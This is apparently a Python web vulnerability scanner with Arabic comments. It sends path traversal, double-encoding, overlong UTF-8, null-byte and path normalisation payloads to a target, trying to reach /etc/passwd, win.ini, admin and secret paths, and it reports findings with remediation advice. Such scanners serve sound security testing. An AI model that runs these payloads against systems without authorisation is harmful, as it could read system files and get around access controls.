"""
Path Confusion Scanner
كشف ثغرات Path Confusion والتلاعب بالمسارات
"""

import requests
from typing import List, Dict
from urllib.parse import urlparse, urljoin


class PathConfusionScanner:
    """ماسح ثغرات Path Confusion"""
    
    def __init__(self, target: str, config: dict = None):
        self.target = target
        self.config = config or {}
        self.session = requests.Session()
        self.vulnerabilities = []
        
    def scan(self) -> List[Dict]:
        """تنفيذ الفحص الكامل"""
        print(f"🔍 Starting Path Confusion scan on: {self.target}")
        
        # 1. Path Traversal
        self._test_path_traversal()
        
        # 2. Double Encoding
        self._test_double_encoding()
        
        # 3. Unicode/UTF-8 Bypass
        self._test_unicode_bypass()
        
        # 4. Null Byte Injection
        self._test_null_byte()
        
        # 5. Path Normalization
        self._test_path_normalization()
        
        # 6. Case Sensitivity
        self._test_case_sensitivity()
        
        # 7. Trailing Slash
        self._test_trailing_slash()
        
        print(f"✅ Found {len(self.vulnerabilities)} path confusion vulnerabilities")
        return self.vulnerabilities
    
    def _test_path_traversal(self):
        """اختبار Path Traversal"""
        print("  📡 Testing path traversal...")
        
        traversal_payloads = [
            '../',
            '../../',
            '../../../',
            '../../../../',
            '../../../../../',
            './',
            '././',
            './.././',
            '..;/',
            '..\\',
            '..\\..\\',
            '%2e%2e/',
            '%2e%2e%2f',
            '..%2f',
            '..%5c',
            '..%255c',
            '..%c0%af',
            '..%c1%9c',
        ]
        
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        for payload in traversal_payloads:
            test_paths = [
                f"{payload}admin",
                f"{payload}etc/passwd",
                f"{payload}windows/win.ini",
                f"admin/{payload}config",
                f"api/{payload}secret",
            ]
            
            for path in test_paths:
                test_url = urljoin(base_url, path)
                
                try:
                    response = self.session.get(test_url, timeout=10, allow_redirects=False)
                    
                    if self._is_traversal_successful(response, path):
                        self.vulnerabilities.append({
                            'type': 'Path Confusion',
                            'subtype': 'Path Traversal',
                            'severity': 'high',
                            'url': test_url,
                            'payload': payload,
                            'path': path,
                            'confidence': 85,
                            'evidence': {
                                'status_code': response.status_code,
                                'content_snippet': response.text[:200]
                            },
                            'description': f'Path traversal possible with: {payload}',
                            'remediation': 'Sanitize and validate all path inputs'
                        })
                        print(f"    ✅ Path traversal: {payload}")
                        return
                        
                except Exception:
                    continue
    
    def _test_double_encoding(self):
        """اختبار Double Encoding"""
        print("  📡 Testing double encoding bypass...")
        
        double_encoded = [
            '%252e%252e%252f',  # ../
            '%252e%252e/',
            '%252e%252e%255c',  # ..\
            '..%252f',
            '..%255c',
        ]
        
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        for payload in double_encoded:
            test_url = f"{base_url}/{payload}admin"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code in [200, 301, 302]:
                    if 'admin' in response.text.lower():
                        self.vulnerabilities.append({
                            'type': 'Path Confusion',
                            'subtype': 'Double Encoding Bypass',
                            'severity': 'high',
                            'url': test_url,
                            'payload': payload,
                            'confidence': 80,
                            'description': 'Double URL encoding bypasses path restrictions',
                            'remediation': 'Decode inputs multiple times and validate'
                        })
                        print(f"    ✅ Double encoding bypass: {payload}")
                        break
                        
            except Exception:
                continue
    
    def _test_unicode_bypass(self):
        """اختبار Unicode Bypass"""
        print("  📡 Testing Unicode/UTF-8 bypass...")
        
        unicode_payloads = [
            '%c0%ae%c0%ae/',  # UTF-8 encoded ../
            '%c0%ae%c0%ae%c0%af',
            '%e0%80%ae%e0%80%ae/',
            '%c0%2e%c0%2e/',
            '..%c0%af',
            '..%c1%9c',
            '%u002e%u002e%u002f',  # Unicode ../
            '%uff0e%uff0e/',
        ]
        
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        for payload in unicode_payloads:
            test_url = f"{base_url}/{payload}admin"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                if self._is_bypass_successful(response):
                    self.vulnerabilities.append({
                        'type': 'Path Confusion',
                        'subtype': 'Unicode/UTF-8 Bypass',
                        'severity': 'high',
                        'url': test_url,
                        'payload': payload,
                        'confidence': 75,
                        'description': 'Unicode encoding bypasses path validation',
                        'remediation': 'Normalize Unicode before validation'
                    })
                    print(f"    ✅ Unicode bypass: {payload}")
                    break
                    
            except Exception:
                continue
    
    def _test_null_byte(self):
        """اختبار Null Byte Injection"""
        print("  📡 Testing null byte injection...")
        
        null_payloads = [
            '%00',
            '%00.jpg',
            '%00.png',
            '%00.txt',
            '/../admin%00',
            '/admin%00.jpg',
        ]
        
        parsed = urlparse(self.target)
        path = parsed.path
        
        for payload in null_payloads:
            test_url = self.target + payload
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    if self._is_bypass_successful(response):
                        self.vulnerabilities.append({
                            'type': 'Path Confusion',
                            'subtype': 'Null Byte Injection',
                            'severity': 'medium',
                            'url': test_url,
                            'payload': payload,
                            'confidence': 70,
                            'description': 'Null byte injection bypasses extension checks',
                            'remediation': 'Filter null bytes from inputs'
                        })
                        print(f"    ⚠️  Null byte injection: {payload}")
                        break
                        
            except Exception:
                continue
    
    def _test_path_normalization(self):
        """اختبار Path Normalization Issues"""
        print("  📡 Testing path normalization...")
        
        normalization_payloads = [
            '/./',
            '/./.',
            '//admin',
            '///admin',
            '/admin/.',
            '/admin/..',
            '/admin/../admin',
            '/./admin',
            '/.//admin',
        ]
        
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        for payload in normalization_payloads:
            test_url = base_url + payload
            
            try:
                response = self.session.get(test_url, timeout=10, allow_redirects=False)
                
                if response.status_code in [200, 301, 302]:
                    self.vulnerabilities.append({
                        'type': 'Path Confusion',
                        'subtype': 'Path Normalization',
                        'severity': 'medium',
                        'url': test_url,
                        'payload': payload,
                        'confidence': 65,
                        'description': 'Inconsistent path normalization detected',
                        'remediation': 'Normalize paths consistently before processing'
                    })
                    print(f"    ⚠️  Path normalization: {payload}")
                    
            except Exception:
                continue
    
    def _test_case_sensitivity(self):
        """اختبار Case Sensitivity"""
        print("  📡 Testing case sensitivity...")
        
        try:
            parsed = urlparse(self.target)
            path = parsed.path
            
            # اختبار حالات مختلفة
            test_cases = [
                path.upper(),
                path.lower(),
                path.capitalize(),
                path.swapcase(),
            ]
            
            responses = []
            for test_path in test_cases:
                test_url = f"{parsed.scheme}://{parsed.netloc}{test_path}"
                
                try:
                    response = self.session.get(test_url, timeout=10, allow_redirects=False)
                    responses.append((test_path, response.status_code))
                except:
                    continue
            
            # فحص إذا كانت النتائج مختلفة
            status_codes = [r[1] for r in responses]
            
            if len(set(status_codes)) > 1:
                self.vulnerabilities.append({
                    'type': 'Path Confusion',
                    'subtype': 'Case Sensitivity Inconsistency',
                    'severity': 'low',
                    'url': self.target,
                    'responses': responses,
                    'confidence': 60,
                    'description': 'Inconsistent case sensitivity handling',
                    'remediation': 'Handle case sensitivity consistently'
                })
                print(f"    ⚠️  Case sensitivity inconsistency")
                
        except Exception as e:
            pass
    
    def _test_trailing_slash(self):
        """اختبار Trailing Slash"""
        print("  📡 Testing trailing slash behavior...")
        
        try:
            # بدون trailing slash
            response1 = self.session.get(self.target, timeout=10, allow_redirects=False)
            
            # مع trailing slash
            target_with_slash = self.target.rstrip('/') + '/'
            response2 = self.session.get(target_with_slash, timeout=10, allow_redirects=False)
            
            # مقارنة النتائج
            if response1.status_code != response2.status_code:
                self.vulnerabilities.append({
                    'type': 'Path Confusion',
                    'subtype': 'Trailing Slash Inconsistency',
                    'severity': 'low',
                    'url': self.target,
                    'without_slash': response1.status_code,
                    'with_slash': response2.status_code,
                    'confidence': 55,
                    'description': 'Inconsistent trailing slash handling',
                    'remediation': 'Handle trailing slashes consistently'
                })
                print(f"    ⚠️  Trailing slash inconsistency")
                
        except Exception as e:
            pass
    
    def _is_traversal_successful(self, response, path: str) -> bool:
        """فحص نجاح Path Traversal"""
        if response.status_code not in [200, 301, 302]:
            return False
        
        text_lower = response.text.lower()
        
        # مؤشرات النجاح
        success_indicators = []
        
        if 'etc/passwd' in path:
            success_indicators = ['root:x:', 'bin/bash', 'daemon:', '/etc/passwd']
        elif 'win.ini' in path:
            success_indicators = ['[fonts]', '[extensions]', '; for 16-bit app']
        elif 'admin' in path:
            success_indicators = ['admin panel', 'administration', 'dashboard']
        
        return any(indicator in text_lower for indicator in success_indicators)
    
    def _is_bypass_successful(self, response) -> bool:
        """فحص نجاح Bypass"""
        if response.status_code != 200:
            return False
        
        text_lower = response.text.lower()
        
        bypass_indicators = [
            'admin', 'dashboard', 'panel',
            'restricted', 'protected', 'authorized'
        ]
        
        error_indicators = ['error', '404', 'not found', 'forbidden']
        
        has_bypass = any(indicator in text_lower for indicator in bypass_indicators)
        has_error = any(error in text_lower for error in error_indicators)
        
        return has_bypass and not has_error
    
    def generate_report(self) -> dict:
        """توليد تقرير شامل"""
        return {
            'scanner': 'Path Confusion Scanner',
            'target': self.target,
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'critical': len([v for v in self.vulnerabilities if v['severity'] == 'critical']),
                'high': len([v for v in self.vulnerabilities if v['severity'] == 'high']),
                'medium': len([v for v in self.vulnerabilities if v['severity'] == 'medium']),
                'low': len([v for v in self.vulnerabilities if v['severity'] == 'low']),
            }
        }


if __name__ == "__main__":
    target = "http://example.com/files/documents"
    scanner = PathConfusionScanner(target)
    results = scanner.scan()
    
    print("\n" + "="*60)
    print("📊 PATH CONFUSION SCAN RESULTS")
    print("="*60)
    report = scanner.generate_report()
    print(f"\nTotal Vulnerabilities: {report['total_vulnerabilities']}")
